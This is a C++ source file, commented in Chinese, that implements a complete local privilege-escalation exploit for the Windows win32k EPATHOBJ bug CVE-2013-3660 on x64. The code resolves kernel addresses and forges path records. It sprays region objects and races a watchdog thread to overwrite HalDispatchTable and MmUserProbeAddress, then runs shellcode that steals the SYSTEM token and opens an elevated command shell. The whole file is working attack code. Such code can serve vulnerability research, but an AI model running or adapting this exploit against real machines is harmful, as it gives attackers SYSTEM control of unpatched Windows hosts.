// CVE-2013-3660-x64-EXP.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//


#include "CVE-2013-3660-x64-EXP.h"


//NtQueryIntervalProfile->KeQueryIntervalProfile->HaliQuerySystemInformation
//实际是fake_HaliQuerySystemInformation。NtQueryIntervalProfile第一个参数就是下面的Buffer
int  ShellCode(ULONG InformationClass,ULONG BufferSize,PVOID Buffer,PULONG RetrunedLeng)
{
	//NtQueryIntervalProfile传的是地址，HaliQuerySystemInformation又取的地址的地址，这里就要取地址出来
	PShellCodeInfo pShellCodeInfo = (PShellCodeInfo)*(ULONG_PTR*)Buffer;
	//pShellCodeInfo->Int3();

#ifdef _WIN64  
	/* FIX MmUserProbeAddress -> ((ULONG_PTR)(0x80000000000UI64 - 0x10000)) */
	*pShellCodeInfo->MmUserProbeAddress = (PVOID)(0x80000000000 - 0x10000);
#endif
#if 1
	PVOID currProcess, sysProcess;
	ULONG_PTR token;
	ULONG_PTR* p1, * p2;
	/* x64 4参数: rcx, rdx, r8, r9 -直接c3即可 */
	* pShellCodeInfo->WriteToHalDispatchTable = pShellCodeInfo->NtSetEaFile;

	currProcess =  pShellCodeInfo->PsGetCurrentProcess();
	sysProcess  = *pShellCodeInfo->PsInitialSystemProcess;
	token = (ULONG_PTR)pShellCodeInfo->PsReferencePrimaryToken(sysProcess);

	p1 = (ULONG_PTR*)currProcess;
	p2 = (ULONG_PTR*)sysProcess;
	//token &= MAX_FAST_REFS;
	/* token 4bit->refcnt */
	while ((*p2 & ~MAX_FAST_REFS) != token) {
		p1++;
		p2++;
	}
	//__debugbreak();
	*p1 = *p2;
#endif
	return 0xC0000018;
}

int __stdcall ShellCode_END() { return 0; };


DWORD InitNtdllExpParam()
{
	HMODULE ntoskrnl = NULL;
	LONG ret;
	BOOL bRet = FALSE;
	HMODULE  ntdll;
	PRTL_PROCESS_MODULES mod = (PRTL_PROCESS_MODULES)&mod;
	PBYTE osBase;
	HMODULE hDllOs;
	ULONG NeededSize;

	ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == NULL)
	{
		return FALSE;
	}

	//搜索Nt*和Zw*都可以，ntdll都导出了
	NtQueryIntervalProfile = (NtQueryIntervalProfile_)GetProcAddress(ntdll, "NtQueryIntervalProfile");
	NtAllocateVirtualMemory = (NtAllocateVirtualMemory_)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
	NtQuerySystemInformation = (NtQuerySystemInformation_)GetProcAddress(ntdll, "NtQuerySystemInformation");
	NtFreeVirtualMemory = (NtFreeVirtualMemory_)GetProcAddress(ntdll, "NtFreeVirtualMemory");
	NtReadVirtualMemory = (NtReadVirtualMemory_)GetProcAddress(ntdll, "ZwReadVirtualMemory");
	NtWriteVirtualMemory = (NtWriteVirtualMemory_)GetProcAddress(ntdll, "NtWriteVirtualMemory");


	printf("NtQueryIntervalProfile = %p\n", NtQueryIntervalProfile);
	printf("NtAllocateVirtualMemory = %p\n", NtAllocateVirtualMemory);
	printf("NtQuerySystemInformation = %p\n", NtQuerySystemInformation);
	printf("NtFreeVirtualMemory = %p\n", NtFreeVirtualMemory);
	printf("NtReadVirtualMemory = %p\n", NtReadVirtualMemory);
	printf("NtWriteVirtualMemory = %p\n", NtWriteVirtualMemory);


	if (!NtQueryIntervalProfile || !NtAllocateVirtualMemory || \
		!NtQuerySystemInformation || !NtFreeVirtualMemory || \
		!NtReadVirtualMemory || !NtWriteVirtualMemory)
	{
		printf("error get ntdll fun address\n");
		return FALSE;
	}


	return TRUE;
}

HMODULE GetKrnlNtBase(char* szNtName, ULONG_PTR* NtKernelLen,const char *Name,const char *Type)
{

	RTL_PROCESS_MODULES  SysModuleInformation;
	DWORD dwRetLength;

	//故意写成0x1让其错误，以得到dwRetLength
	BOOL status = NtQuerySystemInformation(SystemModuleInformation, &SysModuleInformation, 0x1, &dwRetLength);
	if (status != 0xC0000004)
	{
		printf("fpQuerySystemInformation FAILED ,%x\n", status);
		ExitProcess(0);
	}

	PSYSTEM_MODULE_INFORMATION pBuf = (PSYSTEM_MODULE_INFORMATION)LocalAlloc(LMEM_ZEROINIT, dwRetLength);

	if (0 != NtQuerySystemInformation(SystemModuleInformation, pBuf, dwRetLength, &dwRetLength))
	{
		printf("fpQuerySystemInformation FAILED 2\n");
		ExitProcess(0);
	}

	PSYSTEM_MODULE_INFORMATION_ENTRY pModEntry = pBuf->Modules;
	HMODULE hModuleBase = NULL;

	//EnumDeviceDrivers也可以 (python里面用的这个函数)

	for (ULONG i = 0; i < pBuf->NumberOfModules; i++)
	{
		if (!hModuleBase && strstr((char*)pModEntry->FullPathName, Name) && strstr((char*)pModEntry->FullPathName, Type))
		{
			strcpy_s(szNtName, MAX_PATH, (char*)((ULONG_PTR)pModEntry->FullPathName + pModEntry->OffsetToFileName));
			hModuleBase = (HMODULE)(pModEntry->ImageBase);
			*NtKernelLen = pModEntry->ImageSize;
			break;
		}
		pModEntry++;
	}

	if (hModuleBase == NULL)
	{
		printf("FAIL : Get %s Base\n",Name);
		ExitProcess(0);
	}

	LocalFree(pBuf);
	return hModuleBase;
}

int InitNtoskrnlParam()
{

	char NtKernelName[MAX_PATH];
	ULONG_PTR NtKernelLen = 0;
	HMODULE hKrnlNtBase = GetKrnlNtBase(NtKernelName, &NtKernelLen,"krnl","exe");
	HMODULE hUserNtBase = LoadLibraryA(NtKernelName);

	if (hUserNtBase == NULL || hKrnlNtBase == NULL)
	{
		return FALSE;
	}

	HalDispatchTable = (ULONG_PTR*)((ULONG_PTR)GetProcAddress(hUserNtBase, "HalDispatchTable") \
		- (ULONG_PTR)hUserNtBase + (ULONG_PTR)hKrnlNtBase + sizeof(PVOID));

	PsInitialSystemProcess = (PVOID)((ULONG_PTR)GetProcAddress(hUserNtBase, "PsInitialSystemProcess") \
		- (ULONG_PTR)hUserNtBase + (ULONG_PTR)hKrnlNtBase);

	PsReferencePrimaryToken = (PsReferencePrimaryToken_)((ULONG_PTR)GetProcAddress(hUserNtBase, "PsReferencePrimaryToken") \
		- (ULONG_PTR)hUserNtBase + (ULONG_PTR)hKrnlNtBase);

	PsLookupProcessByProcessId = (PsLookupProcessByProcessId_)((ULONG_PTR)GetProcAddress(hUserNtBase, "PsLookupProcessByProcessId") \
		- (ULONG_PTR)hUserNtBase + (ULONG_PTR)hKrnlNtBase);

	MmUserProbeAddress = (PBYTE)GetProcAddress(hUserNtBase, "MmUserProbeAddress")\
		- (ULONG_PTR)hUserNtBase + (ULONG_PTR)hKrnlNtBase;
	NtSetEaFile = (PBYTE)GetProcAddress(hUserNtBase, "NtSetEaFile")
		- (ULONG_PTR)hUserNtBase + (ULONG_PTR)hKrnlNtBase;

	PsGetCurrentProcess = (PsGetCurrentProcess_)((ULONG_PTR)GetProcAddress(hUserNtBase, "PsGetCurrentProcess")
		- (ULONG_PTR)hUserNtBase + (ULONG_PTR)hKrnlNtBase);


	printf("HalDispatchTable = %p\n", HalDispatchTable);
	printf("PsInitialSystemProcess = %p\n", PsInitialSystemProcess);
	printf("PsReferencePrimaryToken = %p\n", PsReferencePrimaryToken);
	printf("PsLookupProcessByProcessId = %p\n", PsLookupProcessByProcessId);
	printf("MmUserProbeAddress = %p\n", MmUserProbeAddress);
	printf("NtSetEaFile = %p\n", NtSetEaFile);
	printf("PsGetCurrentProcess = %p\n", PsGetCurrentProcess);


	if (!HalDispatchTable || !PsInitialSystemProcess || \
		!PsReferencePrimaryToken || !PsLookupProcessByProcessId || \
		!PsInitialSystemProcess || !MmUserProbeAddress || \
		!NtSetEaFile || !PsGetCurrentProcess)
	{
		printf("error get ntdll fun address\n");
		return FALSE;
	}

	return TRUE;

}

int InitHalDllParam()
{

	char NtKernelName[MAX_PATH];
	ULONG_PTR NtKernelLen = 0;
	HMODULE hKrnlNtBase = GetKrnlNtBase(NtKernelName, &NtKernelLen, "hal", "dll");
	HMODULE hUserNtBase = LoadLibraryA("hal.dll");

	if (hKrnlNtBase == NULL || hUserNtBase == NULL)
	{
		printf("Hal.dll hKrnlNtBase Failed!");
		return FALSE;
	}

	HaliQuerySystemInformation = (PVOID)((ULONG_PTR)GetProcAddress(hUserNtBase, "HaliQuerySystemInformation") \
		- (ULONG_PTR)hUserNtBase + (ULONG_PTR)hKrnlNtBase);

	if ( HaliQuerySystemInformation == NULL)
	{
		printf("HaliQuerySystemInformation Failed!");
		return FALSE;
	}
	
	printf("HaliQuerySystemInformation = %p\n", HaliQuerySystemInformation);

	return TRUE;

}

DWORD WINAPI WatchdogThread(LPVOID Parameter)
{
	printf("Enter WatchdogThread!\n");
	if (WaitForSingleObject(Mutex, CYCLE_TIMEOUT) == WAIT_TIMEOUT)
	{
		printf("InterlockedExchangePointer\n");
		while (NumRegion)
		{
			DeleteObject(Regions[--NumRegion]);
		}

		//Int_3();

		InterlockedExchangePointer((volatile PVOID*)&PathRecord->next, &ExploitRecord);
		
	}
	else
	{
		printf("Mutex object did not timeout, list not patched\n");
	}
	printf("Leave WatchdogThread!\n");

	return 0;

}

int InitShellCode()
{

	pShellCodeInfo = (PShellCodeInfo)VirtualAlloc(
		(LPVOID)0x6c30000,
		sizeof(ShellCodeInfo),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if ( pShellCodeInfo ==NULL)
	{
		printf("(PShellCodeInfo)VirtualAlloc Failed!");
		system("pause");
		return FALSE;
	}

	pShellCodeInfo->MmUserProbeAddress = (PVOID*)MmUserProbeAddress;
	pShellCodeInfo->WriteToHalDispatchTable = (PVOID*)HalDispatchTable;
	pShellCodeInfo->PsGetCurrentProcess = PsGetCurrentProcess;
	pShellCodeInfo->PsInitialSystemProcess = (PVOID*)PsInitialSystemProcess;
	pShellCodeInfo->PsReferencePrimaryToken = PsReferencePrimaryToken;
	pShellCodeInfo->NtSetEaFile = NtSetEaFile;
	pShellCodeInfo->Int3 = Int_3;

	CodeAddr = (PVOID)0x1000;
	DWORD_PTR AllocSize = 0x1000;
	DWORD_PTR ADDR = 0;
	while (true)
	{
		DWORD ret = NtAllocateVirtualMemory((HANDLE)-1,
			&CodeAddr,
			0,
			&AllocSize,
			MEM_RESERVE | MEM_COMMIT,
			PAGE_EXECUTE_READWRITE);
		if (ret != 0) {
			ADDR = (DWORD_PTR)CodeAddr + 0x1000;
			CodeAddr = (PVOID)ADDR;
			continue;
		}
		else
		{
			break;
		}
	}
	//这里分配地址大小的空间。地址是0x1F0000，那么分配的空间大小就是0x1F0000
	//因为后面NtReadVirtualMemory时候，这儿的CodeAddr作为地址写入HalDispatchtable+8
	//因为NtReadVirtualMemory的最后一个参数是读入的实际大小，这儿定义的是实际大小
	NtReadVirtualMemoryBuffer = (PBYTE)malloc((SIZE_T)CodeAddr);
	printf("NtReadVirtualMemoryBuffer %p CodeAddr shellcode address:%p\n", \
		NtReadVirtualMemoryBuffer, CodeAddr);
	
	printf("ShellCode_END = %p\n", ShellCode_END);
	printf("ShellCode = %p\n", ShellCode);
	printf("%x\n", (PBYTE)ShellCode_END - (PBYTE)ShellCode);
	//SIZE_T size = 0;
	//int  a = NtReadVirtualMemory((HANDLE)-1, NtReadVirtualMemoryBuffer, NtReadVirtualMemoryBuffer, (SIZE_T)CodeAddr, &size);
	memcpy(CodeAddr, ShellCode, (PBYTE)ShellCode_END - (PBYTE)ShellCode);
	//ShellCode();
	//sh s;
	//s = (sh)CodeAddr;
	//s();
	//printf("addr = %p\n", p);
	return TRUE;

}


static void Exploit(PVOID** MmUserProbeAddressToChange, PVOID AnyVal)
{

	HDC     Device;
	ULONG   PointNum;
	HANDLE  Thread;
	PVOID   Address;
	SIZE_T   AllocSize = 0x1000;
	ULONG   Size;
	INT     ret, i;

	PBYTE   tmp = NULL;
	//PBYTE   CodeAddr = (PBYTE)0x4;

	printf("Enter do_expoite\n");
	PVOID PathRecordAddr = (PVOID)0x5c30000;
	PathRecord = (PPATHRECORD)VirtualAlloc(
		(LPVOID)PathRecordAddr,			//之所以确定等于0x5c30000，是因为后面>>4填充内存的时候，可以让y等于0
		sizeof(PATHRECORD),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if (PathRecord == NULL)
	{
		printf("PathRecord Failed!");
		system("pause");
		return;
	}
	printf("Alllocated userspace PATHRECORD () %p\n", PathRecord);
	memset(PathRecord, 0xCC, sizeof(PATHRECORD));
	PathRecord->next = (PPATHRECORD)PathRecord;
	PathRecord->prev = (PATHRECORD*)(0x42424242);
	PathRecord->flags = 0;

	printf("PathRecord  ->next  @ %p\n", PathRecord->next);
	printf("PathRecord  ->prev  @ %p\n", PathRecord->prev);
	printf("PathRecord creating complex bezier path with %#X\n", (ULONG)(PathRecord) >> 4);

	//ensue ExploitRecord.next -> valid address and end record
	//ExploitRecord.next -> ExploitRecordExit node

	Address = (PVOID)AnyVal;
	//	Address = NULL;
	ret = NtAllocateVirtualMemory((HANDLE)-1,
		&Address,
		0,
		&AllocSize,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);

	if(ret !=0 )
	{
		printf("NtAllocateVirtualMemory val:%p failed\n", Address);
		system("pause");
		return;
	}

	printf("val:%p -> NtAllocateVirtualMemory address:%p\n", AnyVal, Address);

	ExploitRecord.next = (PPATHRECORD)AnyVal;
	ExploitRecord.prev = (PPATHRECORD)MmUserProbeAddressToChange;  //这里就相当重要了，这里就把MmUserProbeAddress修改成了
																   //newpathrec分配的地址，
																   //这个分配地址必须大于nt!HalPrivateDispatchTable+8
	ExploitRecord.flags = PD_BEZIERS | PD_BEGINSUBPATH;
	ExploitRecord.count = 4;
	printf("ExploitRecord  ->next  @ %p\n", ExploitRecord.next);
	printf("ExploitRecord  ->prev  @ %p\n", ExploitRecord.prev);

	ExploitRecordExit = (PPATHRECORD)AnyVal;
	ExploitRecordExit->next = NULL;
	ExploitRecordExit->prev = (PPATHRECORD)&ExploitRecord;
	ExploitRecordExit->flags = PD_BEGINSUBPATH;
	ExploitRecordExit->count = 0;

	printf("Creating complex bezier path with %p\n", ExploitRecordExit);


	for (PointNum = 0; PointNum < MAX_POLYPOINTS; PointNum++) {
#ifdef _WIN64 
		Points[PointNum].x = (ULONG)(PathRecord) >> 4;		 //低4字节直接等于PathRecord地址
		Points[PointNum].y = 0;//(ULONG)(PathRecord) >> 4;   //等于0是因为，让高4字节等于0
#else
		Points[PointNum].x = (ULONG)(PathRecord) >> 4;
		Points[PointNum].y = (ULONG)(PathRecord) >> 4;
#endif
		PointTypes[PointNum] = PT_BEZIERTO;
	}

	
	SetThreadDesktop(CreateDesktopA("DontPanic",
		NULL,
		NULL,
		0,
		GENERIC_ALL,
		NULL));

	while (TRUE)
	{

		// Switch to a dedicated desktop so we don't spam the visible desktop with
		// our Lines (Not required, just stops the screen from redrawing slowly).
		Device = GetDC(NULL);
		Mutex = CreateMutex(NULL, FALSE, NULL);
		WaitForSingleObject(Mutex, INFINITE);
		printf("Mutex = %x\n", Mutex);
		Thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WatchdogThread, NULL, 0, NULL);
		if ( Thread ==NULL)
		{
			printf("Create Thread Failed!\n");
			continue;
		}
		printf("start CreateRoundRectRgn\n");


		for (Size = 1 << 26; Size; Size >>= 1) {
			while (Regions[NumRegion] = CreateRoundRectRgn(0, 0, 1, Size, 1, 1)) {
				NumRegion++;
			}
		}

		printf("Allocated %u/%u HRGN objects\n", NumRegion, MaxRegions);
		printf("Flattening curves...\n");


		for ( PointNum = MAX_POLYPOINTS;PointNum;PointNum-=3)
		{
			BeginPath(Device);
			PolyDraw(Device, Points, PointTypes, PointNum);
			EndPath(Device);
			FlattenPath(Device);
			FlattenPath(Device);

			if (PathRecord->next!=PathRecord)
			{
				DWORD_PTR ret = FALSE;
				SIZE_T Count = 0;
				
				//CodeAddr写入HalDispatchTable，写入HaliQuerySystemInformation
				printf("CodeAddr = %x\n", (SIZE_T)CodeAddr);
				printf("NtReadVirtualMemoryBuffer = %p\n", NtReadVirtualMemoryBuffer);
				printf("HalDispatchTable = %p\n", HalDispatchTable);
				ret  = NtReadVirtualMemory((HANDLE)-1, NtReadVirtualMemoryBuffer,NtReadVirtualMemoryBuffer, (SIZE_T)CodeAddr, HalDispatchTable); 
				printf("ret = %x\n", ret);
				if ( ret == NULL)
				{	
					//在下面的调用shellcode那里打断点
					ULONG ret = 0;
					NtQueryIntervalProfile((ULONG)pShellCodeInfo, &ret);
					ShellExecuteA(NULL, "open", "cmd.exe", NULL, NULL, SW_SHOW);
					return;
				}
			}
			EndPath(Device);
		}

		while (NumRegion) {
			DeleteObject(Regions[--NumRegion]);
		}

		printf("cleaning up...\n");
		ReleaseMutex(Mutex);
		WaitForSingleObject(Thread, INFINITE);
		ReleaseDC(NULL, Device);
		ReleaseDC(NULL, Device);
		printf("ReStarting!\n");
	}
}

int main()
{
	DWORD status = 0;
	status = InitNtdllExpParam();
	if (!status)
	{
		return FALSE;
	}

	status = InitNtoskrnlParam();
	if (!status)
	{
		return FALSE;
	}
	
	//InitHalDllParam可删除
	status = InitHalDllParam();
	if (!status)
	{
		return FALSE;
	}

	status =  InitShellCode();
	if (!status)
	{
		return FALSE;
	}


	Exploit((PVOID**)MmUserProbeAddress, (PVOID)0x4c30000);

	return 0;

}

